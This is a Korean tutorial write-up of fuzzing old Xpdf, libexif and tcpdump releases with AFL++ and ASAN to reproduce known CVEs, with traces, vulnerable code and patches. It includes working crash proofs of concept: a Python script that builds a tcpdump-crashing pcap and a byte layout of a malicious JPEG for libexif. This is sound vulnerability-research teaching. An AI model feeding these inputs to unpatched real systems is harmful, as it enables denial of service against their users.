---
layout: post
title: "[Fuzzing-101] AFL++ 실습 상세 Write-up — Xpdf, libexif, tcpdump CVE 분석"
date: 2026-05-15
category: 블로그/기술
author: yejunkim2000
tags: [Fuzzing, AFL++, ASAN, CVE, Xpdf, libexif, tcpdump, 취약점분석]
---

> **환경:** Docker (Ubuntu 22.04) · AFL++ 4.41a · afl-clang-fast · AFL_USE_ASAN=1

---

## 최종 결과 요약

| Exercise | CVE | 크래시 | 취약점 유형 | 결과 |
|----------|-----|--------|------------|------|
| EX1 Xpdf 3.02 | CVE-2019-13288 | **16개** | stack-overflow + JBIG2 memory corruption | **성공** |
| EX2 libexif 0.6.14 | CVE-2009-3895, CVE-2012-2836 | **32개** | heap-buffer-overflow (WRITE + READ) + stack-overflow | **성공** |
| EX3 tcpdump 4.9.1 | CVE-2017-13028 | **1개+** | heap-buffer-overflow (BOOTP 파서) | **성공** |

---

## 목차

1. [환경 설정](#1-환경-설정)
2. [Exercise 1 — Xpdf 3.02 (CVE-2019-13288)](#2-exercise-1--xpdf-302-cve-2019-13288)
3. [Exercise 2 — libexif 0.6.14 (CVE-2009-3895 + CVE-2012-2836)](#3-exercise-2--libexif-0614-cve-2009-3895--cve-2012-2836)
4. [Exercise 3 — tcpdump 4.9.1 (CVE-2017-13028)](#4-exercise-3--tcpdump-491-cve-2017-13028)
5. [핵심 학습 포인트](#5-핵심-학습-포인트)

---

## 1. 환경 설정

```bash
# Docker 컨테이너 실행
docker run -it --name fuzzing_all \
  -v $(pwd):/host \
  aflplusplus/aflplusplus:4.41a \
  bash

# 작업 디렉터리 구조
/fuzzing/
├── seeds/
│   ├── pdf/          # Xpdf 시드
│   ├── jpeg/         # libexif 시드
│   └── pcap/         # tcpdump 시드
├── output/
│   ├── xpdf2/        # EX1 결과
│   ├── libexif/      # EX2 결과
│   └── tcpdump491/   # EX3 결과
└── build/            # 빌드 디렉터리 (/tmp은 noexec라 사용 불가)
```

> **주의:** Docker 컨테이너 내 `/tmp`는 noexec 마운트이므로 빌드 디렉터리는 반드시 `/fuzzing/build/`를 사용해야 한다.

### 빌드 공통 패턴

```bash
# ① configure — ASAN 플래그 없이 진행
CC=afl-clang-fast ./configure --prefix=/fuzzing/<target>-install

# ② 빌드 — AFL_USE_ASAN=1은 make 시점에만 설정
AFL_USE_ASAN=1 make -j$(nproc)
make install
```

| 방법 | 결과 |
|------|------|
| `CFLAGS="-fsanitize=address" ./configure` | AFL fork server 충돌 (signal 11) |
| `AFL_USE_ASAN=1 make` | **정상 동작** — fork server 호환 |

`AFL_USE_ASAN=1`은 AFL++이 fork server와 ASAN의 충돌을 자동 처리한다.  
configure 단계에서는 설정하지 않고, **make 시점에만** 적용해야 한다.

---

## 2. Exercise 1 — Xpdf 3.02 (CVE-2019-13288)

### 취약점 개요

| 항목 | 내용 |
|------|------|
| CVE | CVE-2019-13288 |
| 대상 | Xpdf 3.02 `pdftotext` |
| 취약점 유형 | 무한 재귀 → 스택 오버플로우 |
| 심각도 | HIGH (DoS / 잠재적 RCE) |
| 공격 벡터 | 악성 PDF 파일 |

### 2-1. 빌드

```bash
cd /fuzzing/build
wget https://dl.xpdfreader.com/old/xpdf-3.02.tar.gz
tar xf xpdf-3.02.tar.gz && cd xpdf-3.02

CC=afl-clang-fast CXX=afl-clang-fast++ \
  ./configure --prefix=/fuzzing/xpdf-install

AFL_USE_ASAN=1 make -j$(nproc)
make install
```

### 2-2. 시드 설계

```
seeds/pdf/
├── minimal.pdf        # 최소 유효 PDF (기본 파서 경로 활성화)
└── jbig2_globals.pdf  # JBIG2Decode + /JBIG2Globals 참조 PDF ← 핵심 시드
```

`jbig2_globals.pdf`는 JBIG2Decode 필터와 `/JBIG2Globals` 딕셔너리 참조를 포함해  
AFL이 변이할 때 JBIG2 파서 코드 경로를 탐색하도록 유도한다.

### 2-3. 퍼징

**1차 시도 (실패) — ASAN 없음:**

```bash
afl-fuzz -i /fuzzing/seeds/pdf \
         -o /fuzzing/output/xpdf \
         -t 20000 \
         -- /fuzzing/xpdf-install/bin/pdftotext @@ /dev/null
# 결과: 5시간(18,140초) → 0 crashes, 22 hangs
# 원인: 무한재귀가 timeout으로 처리됨 (SIGKILL, not SIGABRT)
```

**2차 시도 (성공) — AFL_USE_ASAN=1 + JBIG2 시드:**

```bash
AFL_AUTORESUME=1 AFL_SKIP_CPUFREQ=1 \
afl-fuzz -i /fuzzing/seeds/pdf \
         -o /fuzzing/output/xpdf2 \
         -t 3000 \
         -- /fuzzing/xpdf-asan/bin/pdftotext @@ /dev/null
# 결과: 15분(151,391 execs) → 16 crashes
```

| 항목 | 1차 (ASAN 없음) | 2차 (ASAN + JBIG2) |
|------|----------------|---------------------|
| 실행 시간 | 5시간 (18,140초) | 15분 |
| 총 실행 횟수 | 688,376 | 151,391 |
| 실행 속도 | 37.95 exec/s | 226~444 exec/s |
| 크래시 | **0개** | **16개** |
| hang | 22개 | 26개 |
| 커버리지 | 5.15% | 6.83% |

**핵심:** ASAN 없이는 무한재귀 → "hang". ASAN 적용 후 즉시 stack-overflow 감지 → **37배 효율 차이**

### 2-4. 크래시 분류

| 시그널 | 개수 | 유형 |
|--------|------|------|
| sig:11 (SIGSEGV) | 3개 | stack-overflow (Parser::getObj 무한재귀) |
| sig:06 (SIGABRT) | 13개 | JBIG2 memory corruption |

모든 크래시는 동일 소스(`src:000299`)의 변이 — `jbig2_globals.pdf` 기반 코퍼스.

### 2-5. 크래시 분석

#### 크래시 타입 1: Stack Overflow (CVE-2019-13288)

```bash
# 재현
ASAN_OPTIONS='print_stacktrace=1:detect_stack_use_after_return=0' \
  /fuzzing/xpdf-asan/bin/pdftotext crash_file /dev/null
```

```
==ERROR: AddressSanitizer: stack-overflow on address 0x7ffd43e47de8
    #4  Parser::makeStream(...)    xpdf/Parser.cc:187
    #5  Parser::getObj(...)        xpdf/Parser.cc:94    ← 재귀 진입
    #6  XRef::fetch(int, int, Object*)   xpdf/XRef.cc:823
    #7  Object::fetch(XRef*, Object*)    xpdf/Object.cc:106
    #8  Dict::lookup(char*, Object*)     xpdf/Dict.cc:76
    #10 Stream::makeFilter(...)    xpdf/Stream.cc:264
    #11 Stream::addFilters(...)    xpdf/Stream.cc:110
    #12 Parser::makeStream(...)    xpdf/Parser.cc:203
    #13 Parser::getObj(...)        xpdf/Parser.cc:94    ← 재귀 반복
    ... (수백 프레임 반복)
```

**무한 재귀 경로:**

```
Parser::getObj()          Parser.cc:94
  └─ Parser::makeStream() Parser.cc:203
       └─ Stream::addFilters()    Stream.cc:110
            └─ Stream::makeFilter()   Stream.cc:264
                 └─ Dict::lookup()    Dict.cc:76
                      └─ Object::fetch()   Object.cc:106
                           └─ XRef::fetch()    XRef.cc:823
                                └─ Parser::getObj()  ← 재귀!
```

**원인:** PDF `/DecodeParms` 딕셔너리가 순환 참조를 가질 때 `Parser::getObj()`가  
깊이 제한 없이 재귀 호출 → 스택 소진 → SIGSEGV

#### 크래시 타입 2: JBIG2 메모리 손상 (SIGABRT)

```
==ERROR: AddressSanitizer: unknown-crash on address 0x298f38fd942e84c
    #0  __asan_memset
    #1  JBIG2Bitmap::clearToZero()         JBIG2Stream.cc:747
    #2  JBIG2Stream::readPageInfoSeg(...)  JBIG2Stream.cc:3147
    #3  JBIG2Stream::readSegments()        JBIG2Stream.cc:1352
    #4  JBIG2Stream::reset()               JBIG2Stream.cc:1179
```

```c
// JBIG2Stream.cc:3147 — 취약 코드
width  = readULong();  // 공격자 제어: 0xFFFFFFFF 등 극단값 가능
height = readULong();  // 공격자 제어
bitmap = new JBIG2Bitmap(0, width, height);  // 거대 비트맵 할당
bitmap->clearToZero();   // memset → 잘못된 주소에 쓰기
```

**원인:** JBIG2 Page Info Segment의 width/height 필드에 대한 범위 검증 없음 →  
극단 크기 비트맵 생성 후 `clearToZero()` 시 ASAN이 잘못된 주소(0x298f38fd942e84c) 감지.

### 2-6. 결과

| 항목 | 결과 |
|------|------|
| 크래시 발견 | **16개** (sig:11 × 3, sig:06 × 13) |
| CVE-2019-13288 재현 | **완료** — stack-overflow @ Parser.cc:94 |
| JBIG2 버그 | **완료** — memory corruption @ JBIG2Stream.cc:3147 |
| 위험도 | HIGH — 원격 공격자가 악성 PDF로 트리거 가능 |

---

## 3. Exercise 2 — libexif 0.6.14 (CVE-2009-3895 + CVE-2012-2836)

### 취약점 개요

이 Exercise에서는 두 개의 CVE를 재현한다.

| CVE | 취약 함수 | 유형 | CVSS |
|------|------|------|------|
| CVE-2009-3895 | `exif_entry_fix()` — exif-entry.c | Heap Buffer Overflow (WRITE) | 6.8 |
| CVE-2012-2836 | `exif_data_load_data_entry()` — exif-data.c | Heap Buffer Overflow (READ) | 7.5 |

두 취약점 모두 악성 JPEG/EXIF 파일로 트리거되지만, 발생 위치와 오버플로우 방향이 다르다.

### 3-1. 빌드

```bash
cd /fuzzing/build
wget https://sourceforge.net/projects/libexif/files/libexif/0.6.14/libexif-0.6.14.tar.gz
tar xf libexif-0.6.14.tar.gz && cd libexif-0.6.14

# autoreconf 필요 (configure.ac의 SUBDIRS 패치 포함)
autoreconf -fvi

CC=afl-clang-fast ./configure --prefix=/fuzzing/libexif-install
AFL_USE_ASAN=1 make -j$(nproc)
make install
```

### 3-2. 퍼징

```bash
afl-fuzz -i /fuzzing/seeds/jpeg \
         -o /fuzzing/output/libexif \
         -t 5000 \
         -- /fuzzing/libexif-install/bin/exif @@
# 결과: ~2시간 → 32 crashes
```

### 3-3. 크래시 분류

| 유형 | 위치 | CVE |
|------|------|------|
| heap-buffer-overflow (WRITE) | exif-entry.c | CVE-2009-3895 |
| heap-buffer-overflow (READ) | exif-utils.c:137 | CVE-2012-2836 |
| stack-overflow | exif-loader.c:301 | — |
| SIGSEGV | exif-data.c | — |

### 3-4. 크래시 분석

#### 크래시 타입 1: Heap Buffer Overflow WRITE (CVE-2009-3895)

```
==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x...
WRITE of size 1 at 0x... thread T0
    #0  exif_entry_fix              libexif/exif-entry.c
    #1  fix_func                    libexif/exif-content.c
    #2  exif_content_foreach_entry  libexif/exif-content.c
    #3  exif_content_fix            libexif/exif-content.c
    #4  exif_data_foreach_content   libexif/exif-data.c
    #5  exif_data_fix               libexif/exif-data.c
    #6  exif_data_load_data         libexif/exif-data.c

0x... is located 0 bytes to the right of N-byte region
```

`exif_entry_fix()`는 각 EXIF 엔트리를 표준 형식으로 교정하는 tag fixup 루틴이다.  
`EXIF_TAG_EXIF_VERSION` 등의 태그가 `EXIF_FORMAT_UNDEFINED`로 기록된 경우,  
`EXIF_FORMAT_ASCII`로 변환하면서 버퍼 재할당 크기를 잘못 계산한다.

**취약 코드 (`exif-entry.c`):**

```c
void exif_entry_fix(ExifEntry *e) {
    switch (e->tag) {
    case EXIF_TAG_EXIF_VERSION:
    case EXIF_TAG_FLASH_PIX_VERSION:
        if (e->format == EXIF_FORMAT_UNDEFINED) {
            // ★ e->size 바이트만 할당하고 e->size + 1 바이트 사용
            e->data = exif_mem_realloc(e->priv->mem, e->data, e->size);
            e->data[e->size] = '\0';  // ← 1 byte OOB WRITE!
            e->format = EXIF_FORMAT_ASCII;
            e->size++;
        }
        break;
    }
}
```

**패치 (libexif 0.6.18):** 재할당 크기에 `+1` 추가:

```c
e->data = exif_mem_realloc(e->priv->mem, e->data, e->size + 1);  // ← +1 추가
```

#### 크래시 타입 2: Heap Buffer Overflow READ (CVE-2012-2836)

```
==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x...
READ of size 3 at 0x... thread T0
    #0  exif_get_slong         libexif/exif-utils.c:137
    #1  exif_get_long          libexif/exif-utils.c:156
    #2  exif_entry_fix         libexif/exif-entry.c
    #3  fix_func               libexif/exif-content.c
    #4  exif_content_foreach_entry
    #5  exif_content_fix
    #6  exif_data_foreach_content
    #7  exif_data_fix          libexif/exif-data.c
    #8  exif_data_load_data    libexif/exif-data.c:188   ← 취약점 발원
    #9  exif_loader_get_data

0x... is located 0 bytes to the right of 48-byte region
```

**콜체인:**

```
main()
  └─ exif_loader_get_data()
       └─ exif_data_load_data()           ← JPEG 전체 파싱
            └─ exif_data_load_data_entry() ← IFD 엔트리별 처리
                 │  [doff 범위 미검증 ← 취약점]
                 └─ exif_data_fix()
                      └─ ... → exif_get_slong()
                                    [READ 3 bytes out-of-bounds]
```

**JPEG EXIF IFD 엔트리 구조 (12 bytes):**

```
[Tag 2B][Type 2B][Count 4B][Value/Offset 4B]
```

`Value/Offset`이 4바이트를 초과하면 데이터 블록의 오프셋으로 해석된다.

**취약 코드 (`exif-data.c:188`):**

```c
static void exif_data_load_data_entry(...) {
    s = exif_format_get_size(entry->format) * entry->components;
    if (s > 4) {
        doff = exif_get_long(d + 8, data->priv->order);  // ← 공격자 제어

        // ★ 범위 검증 없음: doff가 ds(전체 데이터 크기)를 초과 가능
        entry->data = exif_mem_alloc(..., s);
        memcpy(entry->data, d + doff, s);   // ← 범위 초과 읽기!
    }
}
```

**공격 시나리오:**

```
정상 JPEG IFD 엔트리:
  [Tag=0x010e][Type=ASCII][Count=5][Offset=26]  ← 유효 범위

악성 JPEG IFD 엔트리:
  [Tag=0x010e][Type=ASCII][Count=5][Offset=0xFFFF]  ← 범위 초과
  → doff = 0xFFFF → d + 0xFFFF → 힙 버퍼 밖 읽기
  → exif_get_slong에서 READ 3 bytes out-of-bounds
```

**패치 (libexif 0.6.21):**

```c
if (doff + s > ds) {
    exif_log(data->priv->log, EXIF_LOG_CODE_CORRUPT_DATA,
             "ExifData", "Offset (%u) out of range", doff);
    return;   // ← 범위 초과 시 조기 반환
}
```

#### 크래시 타입 3: Stack Overflow (무한 재귀)

```
==ERROR: AddressSanitizer: stack-overflow
    #0  exif_loader_write  libexif/exif-loader.c:301
    #1  exif_loader_write  libexif/exif-loader.c:301
    #2  exif_loader_write  libexif/exif-loader.c:301
    ... (200회 이상 반복)
```

```c
// exif-loader.c — 취약 로직
size_t exif_loader_write(ExifLoader *loader, uint8_t *buf, size_t len) {
    // 특정 바이트 패턴에서 자기 자신을 재귀 호출 (깊이 제한 없음)
    return exif_loader_write(loader, buf + consumed, len - consumed);
}
```

**원인:** JPEG 마커 파싱 상태 머신이 잘못된 길이 필드를 만나면 동일 오프셋을 반복 처리 → 무한 재귀 → 스택 소진.

#### 크래시 타입 4: NULL 포인터 역참조 (SIGSEGV)

```
Signal 11 (SIGSEGV) — NULL 포인터 역참조
원인: IFD 엔트리 파싱 실패 후 초기화되지 않은 포인터 사용
```

### 3-5. PoC 최소화

```bash
afl-tmin \
  -i output/libexif/default/crashes/id:000007,... \
  -o crash_min.jpg \
  -- /fuzzing/libexif-asan/bin/exif @@
# 결과: 82 bytes → 70 bytes (14.6% 감소)
```

**최소 PoC 구조 (70 bytes):**

```
FF D8                    # JPEG SOI
FF E1 xx xx              # APP1 마커 + 길이
45 78 69 66 00 00        # "Exif\0\0"
49 49 2A 00 08 00 00 00  # TIFF LE 헤더 (offset=8)
01 00                    # IFD 엔트리 수: 1
0E 01 02 00 05 00 00 00  # Tag=0x010e, Type=ASCII, Count=5
FF FF 00 00              # Offset=0xFFFF ← 범위 초과!
00 00 00 00              # Next IFD = none
FF D9                    # JPEG EOI
```

### 3-6. 결과

| 항목 | 결과 |
|------|------|
| 크래시 발견 | **32개** |
| CVE-2009-3895 재현 | **완료** — heap-buffer-overflow WRITE @ exif-entry.c |
| CVE-2012-2836 재현 | **완료** — heap-buffer-overflow READ @ exif-utils.c:137 |
| PoC 최소화 | 82B → **70B** (afl-tmin, CVE-2012-2836 트리거) |
| 위험도 | HIGH (CVSS 7.5) — 원격 악성 JPEG로 트리거 가능 |

---

## 4. Exercise 3 — tcpdump 4.9.1 (CVE-2017-13028)

### 취약점 개요

| 항목 | 내용 |
|------|------|
| CVE | CVE-2017-13028 |
| 대상 | tcpdump **4.9.1** (취약 버전) |
| 취약점 유형 | BOOTP 파서 heap-buffer-overflow (READ) |
| 취약 함수 | `bootp_print()` — `print-bootp.c:325` |
| 영향 버전 | tcpdump **< 4.9.2** |
| 패치 버전 | 4.9.2 |

> **버전 이슈:** 처음 tcpdump **4.9.2** (패치 버전)으로 시도 → 10,444,871 execs, ASAN 적용, 5,178개 큐 수동 검사 → 0 crashes.  
> CVE 설명 "before 4.9.2"를 확인 후 **4.9.1**로 재빌드 → 즉시 성공.

### 4-1. 빌드

```bash
# libpcap 먼저 빌드
cd /fuzzing/build
wget https://www.tcpdump.org/release/libpcap-1.9.1.tar.gz
tar xf libpcap-1.9.1.tar.gz && cd libpcap-1.9.1
CC=afl-clang-fast ./configure --prefix=/fuzzing/libpcap-install
AFL_USE_ASAN=1 make -j$(nproc) && make install

# tcpdump 4.9.1 빌드
cd /fuzzing/build
wget https://www.tcpdump.org/release/tcpdump-4.9.1.tar.gz
tar xf tcpdump-4.9.1.tar.gz && cd tcpdump-4.9.1

# configure 시 AFL_USE_ASAN 미설정 (컴파일러 검출 실패 방지)
CC=afl-clang-fast \
  ./configure --prefix=/fuzzing/tcpdump491-install \
              LDFLAGS='-L/fuzzing/libpcap-1.9.1 -Wl,-rpath,/fuzzing/libpcap-1.9.1'

# 빌드 시에만 AFL_USE_ASAN=1
AFL_USE_ASAN=1 make -j4 && make install

# ASAN 적용 확인
nm /fuzzing/tcpdump491-install/sbin/tcpdump | grep -c '__asan'
# → 637
```

### 4-2. 취약점 분석

**패치 diff (4.9.1 → 4.9.2):**

```bash
diff /fuzzing/tcpdump-4.9.1/print-bootp.c \
     /fuzzing/tcpdump-4.9.2/print-bootp.c
# 324a325
# >     ND_TCHECK(bp->bp_flags);
```

**딱 한 줄 추가**가 패치 전부다.

**`bootp_print()` 코드 흐름 (4.9.1):**

```c
// print-bootp.c:307 — bp_secs 경계 검사 (offset 8-9)
ND_TCHECK(bp->bp_secs);

// ...secs, xid 출력 후...

// print-bootp.c:325 — bp_flags 읽기 (offset 10-11): 검사 없음! ← BUG
ND_PRINT((ndo, ", Flags [%s]",
    bittok2str(bootp_flag_values, "none", EXTRACT_16BITS(&bp->bp_flags))));

// 4.9.2 패치: ND_TCHECK(bp->bp_flags); 를 위 줄 앞에 추가
```

**트리거 우회 조건:**  
`bp_op == BOOTPREQUEST && bp_htype == 1 && bp_hlen == 6`이면 offset 28의 `ND_TCHECK2(bp_chaddr, 6)` 먼저 실패.  
→ `bp_op = 2` (BOOTPREPLY)로 설정해 해당 분기 우회 후 `bp_flags` OOB에 도달.

### 4-3. 시드 설계

```
seeds/pcap491/
├── bootp_full.pcap     # 정상 BOOTP DHCP Discover (파서 경로 활성화)
├── bootp_bigopt.pcap   # Option 77 len=200 (옵션 파싱 경계 테스트)
├── bootp_badlen.pcap   # 잘못된 옵션 길이 (rfc1048_print 스트레스)
└── snaplen53.pcap      # snaplen=53 ← OOB 경계 시드 (calibration에서 즉시 crash 감지)
```

**핵심 설계 원칙:** pcap 전역 헤더의 `snaplen`이 패킷 크기와 일치하면  
libpcap이 정확히 그 크기만큼 힙을 할당 → ASAN이 OOB read를 즉시 탐지.

### 4-4. 수동 PoC

**최소 트리거 pcap 생성 (Python):**

```python
import struct

def pcap_header(snaplen):
    return struct.pack('<IHHiIII', 0xa1b2c3d4, 2, 4, 0, 0, snaplen, 1)

def pkt_record(data, orig_len=300):
    return struct.pack('<IIII', 0, 0, len(data), orig_len) + data

# BOOTP: op=BOOTPREPLY(2), htype, hlen, hops, xid, secs = 10 bytes
# bp_flags(offset 10-11) 없음 → OOB
bootp = struct.pack('>BBBBIH', 2, 1, 6, 0, 0xdeadbeef, 0x1234)
eth   = b'\xff'*6 + b'\x00\x11\x22\x33\x44\x55' + b'\x08\x00'
udp   = struct.pack('>HHHH', 68, 67, 8+len(bootp), 0)
ip    = struct.pack('>BBHHHBBH4s4s',
        0x45, 0, 20+8+len(bootp), 0, 0, 64, 17, 0,
        b'\xc0\xa8\x01\x02', b'\xff\xff\xff\xff')
pkt   = eth + ip + udp + bootp  # 52 bytes

# snaplen=53: 53바이트 버퍼 할당, bp_flags 읽기 시 1바이트 OOB
with open('cve_trigger.pcap', 'wb') as f:
    f.write(pcap_header(snaplen=53) + pkt_record(pkt))
```

**최소 PoC 구조 (92 bytes):**

```
[pcap global header — 24 bytes]
  magic:    a1 b2 c3 d4
  snaplen:  35 00 00 00  ← 53 — libpcap이 53바이트 버퍼 할당

[packet record header — 16 bytes]
  incl_len: 34 00 00 00  ← 52 (실제 패킷 크기)
  orig_len: 2c 01 00 00  ← 300

[Ethernet 14 + IPv4 20 + UDP 8 + BOOTP 10 = 52 bytes]
  BOOTP:
    op=02 (BOOTPREPLY)  ← chaddr ND_TCHECK 우회
    htype=01, hlen=06, hops=00
    xid=de ad be ef
    secs=12 34          ← 마지막 유효 필드 (offset 8-9)
    [bp_flags 없음]     ← offset 10-11 = 버퍼 끝 너머 → OOB!
```

**ASAN 크래시 출력:**

```
==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x606000000055
READ of size 2 at 0x606000000055 thread T0
    #0 0x... in EXTRACT_16BITS  extract.h:144:20
    #1 0x... in bootp_print     print-bootp.c:325:2   ← CVE-2017-13028
    #2 0x... in ip_print_demux  print-ip.c:387:3
    #3 0x... in ip_print        print-ip.c:658:3
    #4 0x... in ethertype_print print-ether.c:333:10
    #5 0x... in ether_print     print-ether.c:236:7
    #6 0x... in pretty_print_packet  print.c:339:18
    #7 0x... in print_packet    tcpdump.c:2506:2
    #8 0x... in pcap_offline_read  savefile.c:535:4
    #9 0x... in main            tcpdump.c:2009:12

0x606000000055 is located 0 bytes to the right of 53-byte region
                         [0x606000000020, 0x606000000055)
allocated by: pcap_check_header  sf-pcap.c:405:14

SUMMARY: AddressSanitizer: heap-buffer-overflow in EXTRACT_16BITS
==ABORTING
```

**4.9.2 패치 버전 비교:**

```
tcpdump 4.9.1 → heap-buffer-overflow, SIGABRT (exit 134)
tcpdump 4.9.2 → "BOOTP/DHCP, Reply ... [|bootp]", exit 0
                  ↑ ND_TCHECK(bp->bp_flags)가 OOB를 사전 차단
```

### 4-5. AFL 퍼징

`AFL_USE_ASAN=1` 빌드에서 ASAN은 기본적으로 `_exit(1)` 호출 (signal 아님).  
AFL++이 SIGABRT로 감지하게 하려면 `abort_on_error=1` 필수:

```bash
ASAN_OPTIONS='abort_on_error=1:halt_on_error=1:symbolize=0:detect_leaks=0' \
AFL_SKIP_CPUFREQ=1 AFL_NO_UI=1 \
  afl-fuzz \
    -i /fuzzing/seeds/pcap491 \
    -o /fuzzing/output/tcpdump491 \
    -t 5000 \
    -- /fuzzing/tcpdump491-install/sbin/tcpdump -vv -r @@
```

AFL calibration 단계 즉시 감지:

```
[!] WARNING: Test case 'snaplen53.pcap' results in a crash, skipping
```

→ sig:06 (SIGABRT) — AFL이 크래시 파일을 `crashes/` 디렉터리에 저장.

| ASAN 동작 | AFL 인식 |
|-----------|----------|
| `abort()` → SIGABRT | 크래시 감지 |
| `_exit(1)` (기본 AFL_USE_ASAN=1) | **크래시 미감지** |
| `abort_on_error=1` 설정 시 | **크래시 감지** |

**PoC 최소화:**

```bash
afl-tmin -i snaplen53.pcap -o crash_min.pcap \
  -- /fuzzing/tcpdump491-install/sbin/tcpdump -vv -r @@
# 결과: 92 bytes → 92 bytes (pcap 구조상 최소 — 모든 헤더 필수)
```

### 4-6. 결과

| 항목 | 결과 |
|------|------|
| 취약 버전 | tcpdump **4.9.1** |
| ASAN 크래시 | **heap-buffer-overflow @ print-bootp.c:325** |
| CVE-2017-13028 재현 | **완료** — READ 2 bytes past end of 53-byte region |
| AFL 탐지 | calibration 단계 즉시 sig:06 (SIGABRT) 감지 |
| PoC | **92 bytes** (pcap 구조상 더 이상 축소 불가) |
| 패치 | 4.9.2: `ND_TCHECK(bp->bp_flags)` 한 줄 추가 |
| 위험도 | MEDIUM — DoS (원격 공격자가 악성 pcap으로 트리거) |

---

## 5. 핵심 학습 포인트

### 5-1. AFL_USE_ASAN=1 vs -fsanitize=address

| 방법 | 결과 |
|------|------|
| `CFLAGS="-fsanitize=address" ./configure` | AFL fork server 충돌 (signal 11) |
| `AFL_USE_ASAN=1 make` | **정상 동작** — fork server 호환 |

configure 단계에서는 AFL_USE_ASAN 미설정, make 시점에만 적용.

### 5-2. ASAN이 없으면 못 찾는 크래시

```
EX1 — ASAN 없음 (5시간):  0 crashes, 22 hangs  ← 무한재귀 = timeout 처리
EX1 — ASAN 있음 (15분):  16 crashes            ← 37배 효율
```

- **Stack overflow:** ASAN 없이는 무한재귀 → timeout → "hang". ASAN 있으면 즉각 SIGABRT.
- **OOB read:** ASAN 없이는 valid mapping 내이면 SIGSEGV조차 없음 → 탐지 불가.

### 5-3. 시드 품질이 결정적이다

```
EX1: minimal.pdf만          → 5시간 → 0 crashes
EX1: minimal.pdf + jbig2_globals.pdf → 15분 → 16 crashes

EX3: snaplen65535.pcap만    → 크래시 미감지
EX3: snaplen53.pcap 추가    → calibration 즉시 crash 감지
```

CVE 분석 후 관련 파서를 자극하는 구조체를 시드에 포함하는 것이 핵심.

### 5-4. ASAN + AFL 옵션 호환성

```bash
# AFL_USE_ASAN=1 빌드 시 ASAN 크래시를 AFL이 감지하게 하려면:
ASAN_OPTIONS='abort_on_error=1:halt_on_error=1:symbolize=0:detect_leaks=0'
```

| 옵션 | 역할 |
|------|------|
| `abort_on_error=1` | `_exit()` 대신 `abort()` → SIGABRT → AFL이 sig:06으로 감지 |
| `halt_on_error=1` | 첫 번째 오류에서 즉시 중단 (후속 처리 방지) |
| `symbolize=0` | symbolizer 비활성화 (AFL 환경에서 symbolizer 충돌 방지) |
| `detect_leaks=0` | leak sanitizer 비활성화 (false positive 방지) |

### 5-5. 버전 검증 필수

```
CVE-2017-13028: "tcpdump before 4.9.2"
→ 4.9.2 = 패치 버전  →  취약 버전 = 4.9.1
```

NVD의 "Affected Versions" 범위를 퍼징 전에 반드시 확인해야 한다.

### 5-6. 표준 퍼징 워크플로우

```
1. 빌드
   CC=afl-clang-fast ./configure
   AFL_USE_ASAN=1 make -j$(nproc)

2. 시드 설계
   최소 유효 파일 + CVE 관련 특수 구조체 포함

3. 퍼징
   ASAN_OPTIONS='abort_on_error=1:halt_on_error=1:symbolize=0:detect_leaks=0'
   AFL_AUTORESUME=1 afl-fuzz -i seeds -o output -t <timeout> -- <target> @@

4. 크래시 재현
   ASAN_OPTIONS='print_stacktrace=1' <asan-binary> <crash-file>

5. 원인 특정
   스택 트레이스 → 소스 코드 대조 → 취약 로직 확인

6. PoC 최소화
   afl-tmin -i crash -o crash_min -- <target> @@
```

### 5-7. 도구 활용 요약

| 도구 | 용도 | 결과 |
|------|------|------|
| `afl-fuzz` | 커버리지 기반 퍼징 | EX1 16개, EX2 32개, EX3 sig:06 감지 |
| `AFL_USE_ASAN=1` | fork server 호환 ASAN | 크래시 감지 핵심 |
| `ASAN_OPTIONS=abort_on_error=1` | ASAN → SIGABRT 변환 | AFL 크래시 감지 |
| `afl-tmin` | 크래시 입력 최소화 | EX2 82B→70B, EX3 92B(최소) |
| `tmux` | 퍼저 병렬 실행 | 효율적 환경 관리 |
| Python | 구조화된 시드 생성 | JBIG2 PDF, BOOTP pcap |

### 5-8. 최종 결과

| Exercise | CVE | 크래시 | 취약점 | 결과 |
|----------|-----|--------|--------|------|
| EX1 Xpdf 3.02 | CVE-2019-13288 | **16개** | stack-overflow @ Parser.cc:94 + JBIG2 memory corruption | **성공** |
| EX2 libexif 0.6.14 | CVE-2009-3895, CVE-2012-2836 | **32개** | heap-buffer-overflow WRITE @ exif-entry.c + READ @ exif-utils.c:137, PoC 70B | **성공** |
| EX3 tcpdump 4.9.1 | CVE-2017-13028 | **1개+** | heap-buffer-overflow @ print-bootp.c:325, PoC 92B | **성공** |
